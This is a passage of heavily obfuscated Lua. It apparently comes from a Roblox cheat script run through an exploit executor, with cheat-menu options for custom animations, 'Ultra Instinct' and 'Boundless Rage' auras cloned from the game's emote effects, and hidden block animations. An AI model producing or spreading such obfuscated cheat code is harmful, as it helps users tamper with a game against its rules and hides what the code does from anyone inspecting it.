 ) _IlIllIlIlI = RunService.Heartbeat:Connect( function () local _IlIIIllIIl = _lIIlIllIlI.WalkAnimation and _lIIlIllIlI.WalkAnimation.Value or "\078\111\114\109\097\108" if _IlIIIllIIl == "\078\111\114\109\097\108" then _lIIlIIIlII() return end
 local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IlIlIllIll and _IllIllIIll) then _lIIlIIIlII() return end
 if _IllIllIIll.Health <= 0x0 or _IllIllIIll:GetState() == Enum.HumanoidStateType.Dead then _lIIlIIIlII() return end
 if _IlIIIllIIl == "\070\108\121\105\110\103" then if _IIIIlIlIII then pcall( function () _IIIIlIlIII:Stop(0.1) end
 ) _IIIIlIlIII = nil _lIIIlIllIl = "" end
 if not next(_llIlIlIIII) then task.spawn(_IllIIlIIIl) return end
 local _IIIlIIIIIl = _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IIIlIIIIIl then return end
 if _IllIllIIll.MoveDirection == Vector3.new() then _lIIIIlIlll(nil) return end
 local _lIIIlIIIll = _IlllIIllII.MouseBehavior == Enum.MouseBehavior.LockCenter local _IlIllIIllI = math.round(_IllIllIIll.MoveDirection:Dot(_IIIlIIIIIl.CFrame.LookVector)) local _llllIlIIll = math.round(_IllIllIIll.MoveDirection:Dot(_IIIlIIIIIl.CFrame.RightVector)) local _lIlIlllIIl if _lIIIlIIIll then _lIlIlllIIl = {} if _IlIllIIllI == 0x1 then table.insert(_lIlIlllIIl, "\070\111\114\119\097\114\100") elseif _IlIllIIllI == -0x1 then table.insert(_lIlIlllIIl, "\066\097\099\107") end
 if _llllIlIIll == 0x1 then table.insert(_lIlIlllIIl, "\082\105\103\104\116") elseif _llllIlIIll == -0x1 then table.insert(_lIlIlllIIl, "\076\101\102\116") end
 if #_lIlIlllIIl == 0x0 then _lIlIlllIIl = nil end
 else _lIlIlllIIl = { "\070\111\114\119\097\114\100" } end
 _lIIIIlIlll(_lIlIlllIIl) for _lIIlIllIlI, _IlIlIlIlIl in pairs(_llIlIlIIII) do if _IlIlIlIlIl.IsPlaying then pcall( function () _IlIlIlIlIl:AdjustSpeed(_lIIlIllIlI.WalkAnimSpeed and _lIIlIllIlI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 return end
 if next(_llIlIlIIII) then _llIlIIIllI() end
 local _IlIIIllllI = _IlIllIlIIl[_IlIIIllIIl] or "" if _IlIIIllllI == "" then _lIIlIIIlII() return end
 if _lIIIlIllIl ~= _IlIIIllllI then task.spawn(_llIlIllIIl, _IlIIIllllI) return end
 if _IllIllIIll.MoveDirection == Vector3.new() then if _IIIIlIlIII and _IIIIlIlIII.IsPlaying then pcall( function () _IIIIlIlIII:Stop(0.1) end
 ) if _llllIlIlII then _llllIlIlII:Cancel() _llllIlIlII = nil end
 local _lIIIIIIIIl = _lIIlIllIlI.IdleAnimation and _lIIlIllIlI.IdleAnimation.Value or "\078\111\114\109\097\108" if _lIIIIIIIIl == "\078\111\114\109\097\108" then task.spawn( function () RunService.RenderStepped:Wait() end
 ) end
 end
 return end
 if _IIIIlIlIII and not _IIIIlIlIII.IsPlaying then pcall( function () _IIIIlIlIII:Play(0.1) end
 ) if _IlIIIllllI == "\049\055\056\054\048\052\054\055\054\050\056" then pcall( function () _IIIIlIlIII:AdjustSpeed(0x0) end
 ) pcall( function () _IIIIlIlIII.TimePosition = 1.25 end
 ) if _llllIlIlII then _llllIlIlII:Cancel() _llllIlIlII = nil end
 _llllIlIlII = _llIlIIIIII:Create( _IIIIlIlIII, TweenInfo.new(0x2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), { TimePosition = 1.5 } ) _llllIlIlII:Play() end
 end
 if _IIIIlIlIII and _IlIIIllllI ~= "\049\055\056\054\048\052\054\055\054\050\056" then pcall( function () _IIIIlIlIII:AdjustSpeed(_lIIlIllIlI.WalkAnimSpeed and _lIIlIllIlI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 ) table.insert(_IllIllIIll, function () if _IlIIllllII then _IlIIllllII:Disconnect() _IlIIllllII = nil end
 if _IlIllIlIlI then _IlIllIlIlI:Disconnect() _IlIllIlIlI = nil end
 if _llllIlIlII then _llllIlIlII:Cancel() _llllIlIlII = nil end
 _lIIlIIIlII() pcall( function () _lIIlIllIlI.WalkAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) task.spawn( function () local _IlIIIllIIl = _lIIlIllIlI.WalkAnimation and _lIIlIllIlI.WalkAnimation.Value or "\078\111\114\109\097\108" if _IlIIIllIIl == "\078\111\114\109\097\108" then return end
 local _IlIlIllIll = _llIlIIlIll.Character local _IllIllIIll = _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _lllllIIlII = _IllIllIIll and _IllIllIIll:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _lllllIIlII then local _llIIIIlIIl = { ["\055\056\049\053\054\049\056\049\055\053"] = true, ["\049\052\053\049\054\050\055\051\053\048\049"] = true, ["\049\051\057\051\053\053\052\056\053\053\050"] = true } for _lIIlIllIlI, _lllllIlIIl in ipairs(_lllllIIlII:GetPlayingAnimationTracks()) do local _lIlIllIIll = _lllllIlIIl.Animation and _lllllIlIIl.Animation.AnimationId:match("\037\100\043") or "" if _llIIIIlIIl[_lIlIllIIll] then _lllllIlIIl:Stop(0x0) end
 end
 end
 if _IlIIIllIIl ~= "\070\108\121\105\110\103" then local _IlIIIllllI = _IlIllIlIIl[_IlIIIllIIl] or "" if _IlIIIllllI ~= "" then _llIlIllIIl(_IlIIIllllI) local _IlIIIIIllI = _llIlIIlIll.Character local _IllIIllllI = _IlIIIIIllI and _IlIIIIIllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIIIlIlIII and _IllIIllllI and _IllIIllllI.MoveDirection ~= Vector3.new() then pcall( function () _IIIIlIlIII:Play(0.1) end
 ) pcall( function () _IIIIlIlIII:AdjustSpeed(_lIIlIllIlI.WalkAnimSpeed and _lIIlIllIlI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 elseif _IlIIIllIIl == "\070\108\121\105\110\103" then _IllIIlIIIl() end
 end
 ) end
 do local _IIIllllIII = nil local _IllIllIIII = nil local _lIllllIlll = nil local _IIIIlIllII = nil local _IIIIIIlllI = { Spin = "\049\056\056\054\051\050\048\049\049", Crazy = "\054\056\051\051\057\056\052\056" } local _IIlIIIIlII = { "\054\056\051\051\057\056\052\056", "\050\056\051\053\052\053\053\056\051" } local function _IIIIIllIlI() if _IIIllllIII then pcall( function () _IIIllllIII:Stop(0x0) end
 ) _IIIllllIII = nil end
 end
 local function _lIllIIIllI() if _IllIllIIII then pcall( function () _IllIllIIII:Stop(0x0) end
 ) _IllIllIIII = nil end
 end
 local function _lIIlIlllIl() if _lIllllIlll then _lIllllIlll:Disconnect() _lIllllIlll = nil end
 if _IIIIlIllII then _IIIIlIllII:Disconnect() _IIIIlIllII = nil end
 _IIIIIllIlI() _lIllIIIllI() local _lIlIIlIlll = math.random() * 0.15 + 0.05 local _IIIlIIllIl = -0x1 local _IlIlIllIII = false local _llIlllIlll = false local function _lllllIllll(_IIlIIIIIIl, _IlIIIllllI) local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlIIIllllI local _llllllllII, _IlIlIlIlIl = pcall( function () return _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) end
 ) if _llllllllII and _IlIlIlIlIl then _IlIlIlIlIl.Priority = Enum.AnimationPriority.Action3 _IlIlIlIlIl.Looped = false return _IlIlIlIlIl end
 end
 _IIIIlIllII = RunService.RenderStepped:Connect( function () if getgenv().InvisActive then return end
 local _IlIIIllIIl = _lIIlIllIlI.LoopedAnimation and _lIIlIllIlI.LoopedAnimation.Value or "\078\111\110\101" if _IlIIIllIIl ~= "\067\114\097\122\121" then return end
 if _IlIlIllIII and _IIIllllIII then if not _IIIllllIII.IsPlaying then pcall( function () _IIIllllIII:Play() end
 ) end
 pcall( function () _IIIllllIII:AdjustWeight(1e9) end
 ) end
 if _llIlllIlll and _IllIllIIII then if not _IllIllIIII.IsPlaying then pcall( function () _IllIllIIII:Play() end
 ) end
 pcall( function () _IllIllIIII:AdjustWeight(1e9) end
 ) end
 end
 ) _lIllllIlll = RunService.Heartbeat:Connect( function (dt) if getgenv().InvisActive then if _IlIlIllIII or _llIlllIlll then _IlIlIllIII = false _llIlllIlll = false pcall( function () if _IIIllllIII then _IIIllllIII:Stop(0x0) end
 end
 ) pcall( function () if _IllIllIIII then _IllIllIIII:Stop(0x0) end
 end
 ) end
 return end
 local _IlIIIllIIl = _lIIlIllIlI.LoopedAnimation and _lIIlIllIlI.LoopedAnimation.Value or "\078\111\110\101" local _IIIIIIIlII = _IIIIIIlllI[_IlIIIllIIl] local _IIllIIlllI = _llIlIIlIll.Character local _lIlIIllIII = _IIllIIlllI and _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIlIIIIIIl = _lIlIIllIII and _lIlIIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not (_IIllIIlllI and _lIlIIllIII and _IIlIIIIIIl) then _IIIIIllIlI() return end
 if not _IIIIIIIlII then if _IIIllllIII and _IIIllllIII.IsPlaying then _IIIIIllIlI() end
 return end
 if not _IIIllllIII or not _IIIllllIII.Animation.AnimationId:match(_IIIIIIIlII) then _IIIIIllIlI() local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIIIIlII local _llllllllII, _IlIlIlIlIl = pcall( function () return _IIlIIIIIIl:LoadAnimation(_IlIllllIlI) end
 ) if _llllllllII and _IlIlIlIlIl then _IIIllllIII = _IlIlIlIlIl _IIIllllIII.Priority = Enum.AnimationPriority.Action3 _IIIllllIII.Looped = (_IlIIIllIIl ~= "\067\114\097\122\121") end
 _lIlIIlIlll = math.random() * 0.15 + 0.05 _IIIlIIllIl = -0x1 end
 if _IlIIIllIIl == "\067\114\097\122\121" then local _IllIIllIlI = _lIIlIllIlI.LoopedAnimationSpeed and _lIIlIllIlI.LoopedAnimationSpeed.Value or 0x1 if _IIIlIIllIl >= 0x0 then _IIIlIIllIl = _IIIlIIllIl - dt if _IIIlIIllIl <= 0x0 then _IIIlIIllIl = -0x1 _lIlIIlIlll = math.random() * 0.6 + 0.4 end
 elseif not _IlIlIllIII and not _llIlllIlll then _lIlIIlIlll = _lIlIIlIlll - dt if _lIlIIlIlll <= 0x0 then local _IlllllIlIl = math.random(0x1, 0xA) <= 0x6 local _IllIIIlIlI = _IllIllIIII and _IllIllIIII.Animation and _IllIllIIII.Animation.AnimationId:match("\037\100\043") or "" if _IllIIIlIlI ~= _IIlIIIIlII[0x2] then _lIllIIIllI() _IllIllIIII = _lllllIllll(_IIlIIIIIIl, _IIlIIIIlII[0x2]) end
 _llIlllIlll = true pcall( function () _IllIllIIII:Play() end
 ) pcall( function () _IllIllIIII:AdjustSpeed(_IllIIllIlI * 0x2) end
 ) if _IlllllIlIl then local _lllIllIlll = _IIIllllIII and _IIIllllIII.Animation and _IIIllllIII.Animation.AnimationId:match("\037\100\043") or "" if _lllIllIlll ~= _IIlIIIIlII[0x1] then _IIIIIllIlI() _IIIllllIII = _lllllIllll(_IIlIIIIIIl, _IIlIIIIlII[0x1]) end
 _IlIlIllIII = true pcall( function () _IIIllllIII:Play() end
 ) pcall( function () _IIIllllIII:AdjustSpeed(_IllIIllIlI * 0x3) end
 ) task.delay(math.random() * 0.03 + 0.03, function () if _IlIIIllIIl ~= "\067\114\097\122\121" then return end
 _IlIlIllIII = false pcall( function () if _IIIllllIII then _IIIllllIII:Stop(0x0) end
 end
 ) end
 ) end
 task.delay(math.random() * 0.04 + 0.04, function () if _IlIIIllIIl ~= "\067\114\097\122\121" then return end
 _llIlllIlll = false pcall( function () if _IllIllIIII then _IllIllIIII:Stop(0x0) end
 end
 ) _IIIlIIllIl = math.random() * 0.05 end
 ) end
 end
 else if _IIIllllIII then _IIIllllIII.Looped = true if not _IIIllllIII.IsPlaying then _IIIllllIII:Play() end
 pcall( function () _IIIllllIII:AdjustSpeed(_lIIlIllIlI.LoopedAnimationSpeed and _lIIlIllIlI.LoopedAnimationSpeed.Value or 0x1) end
 ) end
 end
 end
 ) end
 _lIIlIlllIl() _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) local _lIlIIllIII = _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _lIlIIllIII then return end
 local _IIlIIIIIIl = _lIlIIllIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if not _IIlIIIIIIl then return end
 task.wait(0.1) _lIIlIlllIl() end
 ) table.insert(_IllIllIIll, function () if _lIllllIlll then _lIllllIlll:Disconnect() _lIllllIlll = nil end
 if _IIIIlIllII then _IIIIlIllII:Disconnect() _IIIIlIllII = nil end
 _IIIIIllIlI() _lIllIIIllI() pcall( function () _lIIlIllIlI.LoopedAnimation:SetValue("\078\111\110\101") end
 ) end
 ) end
 if _lllIIllIII and _lllIlIIlIl then local _IIIIllIlII = _lllIlIIlIl _IIIIllIlII:AddDropdown("\067\117\115\116\111\109\066\108\111\099\107\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\114\109\097\108", "\079\110\101\032\072\097\110\100", "\071\111\106\111", "\073\110\102\105\110\105\116\121", "\066\111\120\101\114" }, Default = 0x1, Multi = false, Text = "\066\108\111\099\107\032\065\110\105\109\097\116\105\111\110", }) _IIIIllIlII:AddToggle("\085\073\082\101\097\099\116\069\110\097\098\108\101\100", { Text = "\085\108\116\114\097\032\073\110\115\116\105\110\099\116\032\082\101\097\099\116\105\111\110", Default = false, }) _IIIIllIlII:AddSlider("\085\073\082\101\097\099\116\086\111\108\117\109\101", { Text = "\086\111\108\117\109\101", Default = 0x1, Min = 0x0, Max = 0x1, Rounding = 0x1, }) _IIIIllIlII:AddDropdown("\065\117\114\097\083\101\108\101\099\116\105\111\110", { Text = "\065\117\114\097", Values = { "\085\108\116\114\097\032\073\110\115\116\105\110\099\116", "\066\111\117\110\100\108\101\115\115\032\082\097\103\101" }, Default = {}, Multi = true, }) _IIIIllIlII:AddSlider("\065\117\114\097\086\111\108\117\109\101", { Text = "\086\111\108\117\109\101", Default = 0x1, Min = 0x0, Max = 0x1, Rounding = 0x2, }) local _IlllIIIIlI = nil local _llIlllIIII = nil local _lllIIIIIII = true local function _IlllIIIlII() if _IlllIIIIlI then _IlllIIIIlI:Disconnect() _IlllIIIIlI = nil end
 if _llIlllIIII then _llIlllIIII:Disconnect() _llIlllIIII = nil end
 _isBlocking = false _suppressNext = false local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not (_IIllIIlllI and _lIlIIllIII) then return end
 _IlllIIIIlI = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IllIlIllll = _lIIlIllIlI.CustomBlockAnimation.Value local _IIllIIIlll = _IlIlIlIlIl.Animation.AnimationId if (_IIllIIIlll:match("\049\048\052\055\048\051\056\057\056\050\055") or _IIllIIIlll:match("\049\051\051\056\048\055\055\056\049\057\051") or _IIllIIIlll:match("\049\051\057\051\053\053\052\056\053\053\050")) and _IllIlIllll ~= "\078\111\114\109\097\108" then if _llIIllIlll.InvisibleMoves_Block.Value then _IlIlIlIlIl:AdjustWeight(-0xF423F) else _IlIlIlIlIl:Stop() end
 end
 end
 ) local _IllIlIIllI = { "\049\051\051\048\057\052\054\054\050\048\052\057\049\053\053", "\049\051\052\055\049\049\055\051\049\055\050\057\057\056\054", "\055\054\057\054\051\057\054\053\052\048\054\050\057\054", "\057\050\053\052\054\055\057\049\050\053\049\054\051\051", "\049\050\056\049\056\056\055\050\053\049\051\052\049\049\052", "\049\048\057\048\056\056\054\051\050\056\054\048\052\056\056", "\055\056\051\051\057\050\055\050\054\048\050\055\051\051", "\049\050\055\048\049\053\054\057\055\048\051\054\048\055\053", } local _lIIlIIllIl = { "\055\050\053\053\053\052\051\052\050\056\056\057\056\053", "\057\049\048\054\055\050\057\052\054\052\050\052\052\050", "\049\048\052\049\050\052\053\051\052\057\050\051\050\054\056" } local _lIllIIIlII = 0x0 local _lIllIlIIII = nil local _llIlIlIlIl = 0x1 local _llIIllllIl = nil local function _IIIIIlIIll() if _lIllIlIIII and _lIllIlIIII.IsPlaying then _lIllIlIIII:Stop() end
 local _lllIIlIlIl = Instance.new("\065\110\105\109\097\116\105\111\110") _lllIIlIlIl.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IllIlIIllI[_llIlIlIlIl] _lIllIlIIII = _lIlIIllIII:LoadAnimation(_lllIIlIlIl) _lIllIlIIII.Priority = Enum.AnimationPriority.Action4 _lIllIlIIII:Play(0.05) _lIllIlIIII.TimePosition = 0.2 _lIllIlIIII:AdjustSpeed(1.2) _llIlIlIlIl = _llIlIlIlIl + 0x1 if _llIlIlIlIl > #_IllIlIIllI then _llIlIlIlIl = 0x1 end
 local _IIllIIIIll = Instance.new("\083\111\117\110\100", _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllIIlllI) _IIllIIIIll.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lIIlIIllIl[math.random(0x1, #_lIIlIIllIl)] _IIllIIIIll.Volume = _lIIlIllIlI.UIReactVolume.Value _IIllIIIIll:Play() task.delay(_IIllIIIIll.TimeLength + 0x4, function () pcall( function () _IIllIIIIll:Destroy() end
 ) end
 ) end
 _llIlllIIII = _IIllIIlllI:GetAttributeChangedSignal("\066\108\111\099\107\082\101\097\099\116"):Connect( function () if not _llIIllIlll.UIReactEnabled.Value then return end
 local _IlIllIllIl = math.abs(_IIllIIlllI:GetAttribute("\066\108\111\099\107\082\101\097\099\116") or 0x0) if _lIllIIIlII < _IlIllIllIl or math.abs(_IlIllIllIl - _lIllIIIlII) > 0x1 then _IIIIIlIIll() end
 _lIllIIIlII = _IlIllIllIl end
 ) task.spawn( function () while _lllIIIIIII and _llIlIIlIll.Character == _IIllIIlllI do local _IIIIlIIIlI local _lllIlIlIll = '' repeat repeat task.wait() if not _lllIIIIIII or _llIlIIlIll.Character ~= _IIllIIlllI then return end
 until _IIllIIlllI:GetAttribute("\066\108\111\099\107\105\110\103") == true _IIIIlIIIlI = _lIIlIllIlI.CustomBlockAnimation.Value _lllIlIlIll = _IIIIlIIIlI == "\078\111\114\109\097\108" and '' or (_IIIIlIIIlI == "\079\110\101\032\072\097\110\100" and "\049\055\048\057\055\049\052\054\053\057\057" or (_IIIIlIIIlI == "\071\111\106\111" and "\049\056\052\053\057\049\055\056\051\053\051" or (_IIIIlIIIlI == "\073\110\102\105\110\105\116\121" and "\049\053\048\050\048\057\054\053\048\057\052" or (_IIIIlIIIlI == "\066\111\120\101\114" and "\049\052\054\049\054\050\055\050\054\054\056" or '')))) until not _lllIlIlIll:match("\094\037\115\042\036") if not _lllIIIIIII or _llIlIIlIll.Character ~= _IIllIIlllI then return end
 local _lIIlIllIll pcall( function () local _lllIIlIlIl = Instance.new("\065\110\105\109\097\116\105\111\110") _lllIIlIlIl.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _lllIlIlIll _lIIlIllIll = _lIlIIllIII:LoadAnimation(_lllIIlIlIl) end
 ) if not _lIIlIllIll then task.wait(0.1) continue end
 _llIIllllIl = _lIIlIllIll pcall( function () if not _lIIlIllIll.IsPlaying then _lIIlIllIll.Looped = true _lIIlIllIll:Play() if _lllIlIlIll == "\049\055\048\057\055\049\052\054\053\057\057" then _lIIlIllIll.TimePosition = 0x1 _lIIlIllIll:AdjustSpeed(0x0) elseif _lllIlIlIll == "\049\056\052\053\057\049\055\056\051\053\051" then _lIIlIllIll.TimePosition = 0.5 _lIIlIllIll:AdjustSpeed(0x0) elseif _lllIlIlIll == "\049\053\048\050\048\057\054\053\048\057\052" then _lIIlIllIll.TimePosition = 0x1 _lIIlIllIll:AdjustSpeed(0x0) elseif _lllIlIlIll == "\049\052\054\049\054\050\055\050\054\054\056" then _lIIlIllIll.TimePosition = 0.25 _lIIlIllIll:AdjustSpeed(0x0) game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_lIIlIllIll, TweenInfo.new(0x2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0.4}):Play() end
 end
 end
 ) repeat task.wait() until _IIllIIlllI:GetAttribute("\066\108\111\099\107\105\110\103") ~= true or not _lllIIIIIII or _llIlIIlIll.Character ~= _IIllIIlllI pcall( function () if _lIIlIllIll then _lIIlIllIll:Stop(0.1) end
 end
 ) _llIIllllIl = nil end
 end
 ) end
 if _llIlIIlIll.Character then task.spawn(_IlllIIIlII) end
 local _lIIlllIIIl = _llIlIIlIll.CharacterAdded:Connect( function (newChar) newChar:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) task.spawn(_IlllIIIlII) end
 ) table.insert(_IllIllIIll, function () _lllIIIIIII = false if _IlllIIIIlI then _IlllIIIIlI:Disconnect() _IlllIIIIlI = nil end
 if _llIlllIIII then _llIlllIIII:Disconnect() _llIlllIIII = nil end
 if _lIIlllIIIl then _lIIlllIIIl:Disconnect() _lIIlllIIIl = nil end
 pcall( function () _llIIllIlll.UIReactEnabled:SetValue(false) end
 ) pcall( function () _lIIlIllIlI.CustomBlockAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) local _IIlIIlIlII = nil local _lIIIlllIIl = {} local _lIlIIIIlII = { UI = false, BR = false } local function _lIlllIllll(_IIllIIlllI, _lIIIIllIIl) if not _IIllIIlllI then return end
 for _lIIlIllIlI, _lIllllllII in ipairs(_IIllIIlllI:GetDescendants()) do if _lIllllllII.Name == "\065\117\114\097\072\111\108\100\101\114\095" .. _lIIIIllIIl then for _lIIlIllIlI, _lIlIlllIII in ipairs(_lIllllllII:GetChildren()) do if _lIlIlllIII:IsA("\079\098\106\101\099\116\086\097\108\117\101") and _lIlIlllIII.Value then pcall( function () _lIlIlllIII.Value:Destroy() end
 ) end
 end
 pcall( function () _lIllllllII:Destroy() end
 ) end
 end
 if _lIIIIllIIl == "\066\082" then for _lIIlIllIlI, _IllllIIIlI in ipairs(_lIIIlllIIl) do pcall( function () if _IllllIIIlI and _IllllIIIlI.Parent then _IllllIIIlI:Destroy() end
 end
 ) end
 _lIIIlllIIl = {} end
 end
 local function _IlllIIIlIl(_IIllIIlllI) if not _IIllIIlllI then return end
 local _llllllllII, _llIIIIllll = pcall( function () return game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101").Emotes.VFX.VfxMods.Evolved.vfx.Folder end
 ) if not _llllllllII or not _llIIIIllll then return end
 local _lIlIIlllll = Instance.new("\070\111\108\100\101\114") _lIlIIlllll.Name = "\065\117\114\097\072\111\108\100\101\114\095\085\073" pcall( function () _lIlIIlllll:SetAttribute("\068\105\118\105\110\101\070\111\114\109", true) end
 ) pcall( function () _lIlIIlllll:SetAttribute("\076\105\109\065\117\114\097", true) end
 ) _lIlIIlllll.Parent = _IIllIIlllI for _lIIlIllIlI, _IllllllIIl in ipairs(_llIIIIllll:GetChildren()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then local _IllIllllll = _IIllIIlllI:FindFirstChild(_IllllllIIl.Name) if _IllIllllll then local _IlIllIllII = _IllllllIIl:Clone() pcall( function () _IlIllIllII:SetAttribute("\076\105\109\065\117\114\097", true) end
 ) _IlIllIllII.Transparency = 0x1 _IlIllIllII.Massless = true _IlIllIllII.Name = tostring(math.random(0x1, 0xF4240)) local _lllIllIIII = Instance.new("\087\101\108\100") _lllIllIIII.Part0 = _IllIllllll _lllIllIIII.Part1 = _IlIllIllII _lllIllIIII.Parent = _IlIllIllII _IlIllIllII.Parent = _lIlIIlllll for _lIIlIllIlI, desc in ipairs(_IlIllIllII:GetDescendants()) do if desc:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") or desc:IsA("\066\101\097\109") then pcall( function () desc:SetAttribute("\076\105\109\105\116\101\100\065\117\114\097", true) end
 ) end
 end
 end
 end
 end
 end
 local function _llIllllIlI(_IIllIIlllI) if not _IIllIIlllI then return end
 local _llllllllII, auraChar = pcall( function () return game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101").Emotes.VFX.VfxMods.Boundless.vfx.AuraChar:Clone() end
 ) if not _llllllllII or not auraChar then return end
 local _lIlIIlllll = Instance.new("\070\111\108\100\101\114") _lIlIIlllll.Name = "\065\117\114\097\072\111\108\100\101\114\095\066\082" _lIlIIlllll.Parent = _IIllIIlllI local _lIIIIIllII = _IIllIIlllI:FindFirstChild("\084\111\114\115\111") or _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lIIIIIllII then local _IllllIIIlI = Instance.new("\083\111\117\110\100") _IllllIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\056\049\048\053\053\057\057\048\053\056\049\054\053\048" _IllllIIIlI.Looped = true _IllllIIIlI.Volume = _lIIlIllIlI.AuraVolume.Value _IllllIIIlI.Name = "\066\082\065\117\114\097\083\111\117\110\100" _IllllIIIlI.Parent = _lIIIIIllII _IllllIIIlI:Play() table.insert(_lIIIlllIIl, _IllllIIIlI) end
 for _lIIlIllIlI, _IllllllIIl in ipairs(auraChar:GetChildren()) do if _IllllllIIl:IsA("\066\097\115\101\080\097\114\116") then local _IllIllllll = _IIllIIlllI:FindFirstChild(_IllllllIIl.Name) if _IllIllllll then for _lIIlIllIlI, desc in ipairs(_IllllllIIl:GetChildren()) do if desc:IsA("\065\116\116\097\099\104\109\101\110\116") or desc:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then local _IlIllIllII = desc:Clone() pcall( function () _IlIllIllII:SetAttribute("\076\105\109\105\116\101\100\065\117\114\097", true) end
 ) _IlIllIllII.Parent = _IllIllllll local _IIllllIIIl = Instance.new("\079\098\106\101\099\116\086\097\108\117\101") _IIllllIIIl.Name = "\066\082\065\117\114\097\082\101\102" _IIllllIIIl.Value = _IlIllIllII _IIllllIIIl.Parent = _lIlIIlllll end
 end
 end
 end
 end
 auraChar:Destroy() end
 local function _lIlIlIIIII(_IIllIIlllI) if not _IIllIIlllI then return end
 local _IIlIlIIlII = _lIIlIllIlI.AuraSelection and _lIIlIllIlI.AuraSelection.Value or {} local _IllIIIIIII = rawget(_IIlIlIIlII, "\085\108\116\114\097\032\073\110\115\116\105\110\099\116") and true or false local _IIIIIllIII = rawget(_IIlIlIIlII, "\066\111\117\110\100\108\101\115\115\032\082\097\103\101") and true or false if _lIlIIIIlII.UI and not _IllIIIIIII then _lIlllIllll(_IIllIIlllI, "\085\073") _lIlIIIIlII.UI = false end
 if _lIlIIIIlII.BR and not _IIIIIllIII then _lIlllIllll(_IIllIIlllI, "\066\082") _lIlIIIIlII.BR = false end
 if _IllIIIIIII and not _lIlIIIIlII.UI then _IlllIIIlIl(_IIllIIlllI) _lIlIIIIlII.UI = true end
 if _IIIIIllIII and not _lIlIIIIlII.BR then _llIllllIlI(_IIllIIlllI) _lIlIIIIlII.BR = true end
 end
 local function _lllIIIlIIl() local _IlllllIIlI = _lIIlIllIlI.AuraVolume.Value local _IIllIIlllI = _llIlIIlIll.Character if _IIllIIlllI then for _lIIlIllIlI, _IllllIIIlI in ipairs(_lIIIlllIIl) do pcall( function () _IllllIIIlI.Volume = _IlllllIIlI end
 ) end
 end
 end
 _lIIlIllIlI.AuraSelection:OnChanged( function () _lIlIlIIIII(_llIlIIlIll.Character) end
 ) _lIIlIllIlI.AuraVolume:OnChanged( function () _lllIIIlIIl() end
 ) _IIlIIlIlII = _llIlIIlIll.CharacterAdded:Connect( function (newChar) _lIlIIIIlII = { UI = false, BR = false } task.wait(0x1) _lIlIlIIIII(newChar) end
 ) table.insert(_IllIllIIll, function () local _IIllIIlllI = _llIlIIlIll.Character if _IIllIIlllI then _lIlllIllll(_IIllIIlllI, "\085\073") _lIlllIllll(_IIllIIlllI, "\066\082") end
 _lIlIIIIlII = { UI = false, BR = false } if _IIlIIlIlII then _IIlIIlIlII:Disconnect() _IIlIIlIlII = nil end
 pcall( function () _lIIlIllIlI.AuraSelection:SetValue({}) end
 ) end
 ) end
 if _lllIIllIII and _lIIIlIIIlI.Misc and _lllIlIIIIl then local _IIIlIIlllI = _lllIlIIIIl local _IlIIlIllIl = { { trigger = "\049\048\052\054\056\054\054\053\057\057\049", _IllIlIlIII = "\078\111\114\109\097\108\032\080\117\110\099\104", key = "\078\080" }, { trigger = "\049\048\052\054\054\057\055\052\056\048\048", _IllIlIlIII = "\067\111\110\115\101\099\117\116\105\118\101\032\080\117\110\099\104\101\115", key = "\067\080" }, { trigger = "\049\048\052\055\049\051\051\054\055\051\055", _IllIlIlIII = "\083\104\111\118\101", key = "\083\072" }, { trigger = "\049\050\053\049\048\049\055\048\057\056\056", _IllIlIlIII = "\085\112\112\101\114\099\117\116", key = "\085\067" }, } local _IIllIllIII = { ["\078\080"] = { { _lIIIIllIIl = "\079\112\101\110", _IlIIIllllI = "\049\056\057\048\051\054\052\050\056\053\051", timePos = 3.3, _IllIIllIlI 